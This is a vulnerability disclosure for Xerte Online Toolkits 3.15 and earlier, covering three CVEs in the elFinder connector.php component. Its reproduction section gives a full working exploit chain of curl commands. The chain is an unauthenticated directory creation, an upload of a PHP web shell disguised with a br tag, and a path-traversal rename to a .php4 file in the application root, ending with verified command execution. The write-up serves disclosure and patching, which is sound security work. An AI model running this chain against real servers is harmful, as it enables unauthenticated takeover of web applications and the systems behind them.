# Xerte Online Toolkits <= 3.15 Remote Code Execution

Xerte Online Toolkits versions 3.15 and earlier suffer from 3 vulnerabilities in the /editor/elfinder/php/connector.php component, which may be chained together by an unauthenticated attacker to achieve Remote Code Execution (RCE).

## Affected Versions

Xerte Online Toolkits <= 3.15

A backported patch has been applied to versions 3.15, 3.14, and 3.13

## CWE-306: Missing Authentication for Critical Function - CVE-2026-34413

Unauthenticated users can make requests to the connector component at /editor/elfinder/php/connector.php

The following code is used as an access control.

File: /editor/elfinder/php/connector.php
Line Number: 35

~~~
if (!isset($_SESSION['toolkits_logon_id'])){
    header("location: ../../../index.php");
}
~~~

This redirects unauthenticated users preventing them from recieving the response of unauthenticated requests, however this does not terminate the session and subsequent code is still executed.

## CWE-23: Relative Path Traversal - CVE-2026-34414

*Requires attacker to know the filename of the file they want to move

Attackers can manipulate the "name" parameter in a "rename" request to the connector.php endpoint. This allows attackers to use an existing directory to move files outside of the users media directory.

## CWE-184: Incomplete List of Disallowed Inputs - CVE-2026-34415

Because of a mistake in the connector.php file extension filter regex, attackers can chain a path traversal vulnerability present in the same versions of Xerte to move a file with malicious PHP code to the application root with a .php4 extension.

File: /editor/elfinder/php/connector.php
Line Number: 130

~~~php
array( // hide readmes
    'pattern' => '/(readme\.txt)|\.(html|php|php5|php*|phtml|phar|inc|py|pl|sh)$/i',
    'read'   => false,
~~~

The `php*` regex only matches the preceding character. Therefore it would match the following "ph", "php", "phppp", etc...

## Chained Attack Vector Reproduction Steps

### Unauthenticated Remote Code Execution

If authentication is enabled (which is not the default Xerte configuration) then an attacker must know (or brute force for) a valid user's username. If Guest authentication is used (the default), then the target project directory would simply be 1--Nottingham.

An unauthenticated attacker can create a directory "example_dir" and upload a "file.txt" file with malicious PHP code to any project directory under USER-FILES/

They can then use the Relative Path Traversal and Incomplete List of Disallowed Inputs vulnerabilities present in Xerte to perform path traversal by changing the uploaded filename to "example_dir/../../../../file.php4", moving file.txt to the application root as "file.php4", giving the attacker remote code execution.

1. Retrieve the full application root filepath

~~~bash
curl 'http://localhost/xt/setup'
~~~

2. Create the directory

Request Params:
    uploadDir: Application root + USER-FILES/{project id}-{user}-Nottingham/
    uploadURL: URL to the project directory
    cmd: mkdir
    name: The new directories name
    target: The media/ directories elfinder id. Because this is the elfinder root, it will always be "l1_Lw"

~~~bash
curl 'http://localhost/xt/editor/elfinder/php/connector.php?uploadDir=/opt/lampp/htdocs/xt/USER-FILES/1-user2-Nottingham/&uploadURL=http://localhost/xt/USER-FILES/1-user2-Nottingham/&cmd=mkdir&name=folder1&target=l1_Lw'
~~~

3. Upload malicious php file

*The <br> tag in the payload prevents the elfinder MIME type filter from detecting PHP code.

Request Params:
    uploadDir: Application root + USER-FILES/{project id}-{user}-Nottingham/
    uploadURL: URL to the project directory
    cmd: upload
    target: The media/ directories elfinder id. Because this is the elfinder root, it will always be "l1_Lw"
    upload[]: The file to be uploaded.

~~~bash
echo '<br><?php system($_GET["cmd"]); ?>' > file.txt
curl -X POST 'http://localhost/xt/editor/elfinder/php/connector.php?uploadDir=/opt/lampp/htdocs/xt/USER-FILES/1-user2-Nottingham/&uploadURL=http://localhost/xt/USER-FILES/1-user2-Nottingham/' \
    -F 'cmd=upload' \
    -F 'target=l1_Lw' \
    -F "upload[]=@file.txt;type=text/plain"
~~~

4. Generate the elfinder id for the new file

~~~bash
echo -n 'file.txt' | base64
ZmlsZS50eHQ=
~~~

Ensure you trim the padding, in this case its just "="

Add the volume identifer. This will always be "l1" (as in "/")

Result: `l1_ZmlsZS50eHQ`

5. Rename the file and perform Relative Path Traversal

Request Params:
    uploadDir: Application root + USER-FILES/{project id}-{user}-Nottingham/
    uploadURL: URL to the project directory
    cmd: rename
    name: The directory name, path traversal sequence, and new file name with .php4 extension
    target: The elfinder id we generated from the new File `l1_ZmlsZS50eHQ`

~~~bash
curl 'http://localhost/xt/editor/elfinder/php/connector.php?uploadDir=/opt/lampp/htdocs/xt/USER-FILES/1-user2-Nottingham/&uploadURL=http://localhost/xt/USER-FILES/1-user2-Nottingham/&cmd=rename&name=folder1%2F..%2F..%2F..%2F..%2Fs.php4&target=l1_ZmlsZS50eHQ'
~~~

6. Verify code execution

Request Params:
    cmd: The command to run

~~~bash
curl http://localhost/xt/s.php4?cmd=id
<br>uid=1(daemon) gid=1(daemon) groups=1(daemon)
~~~
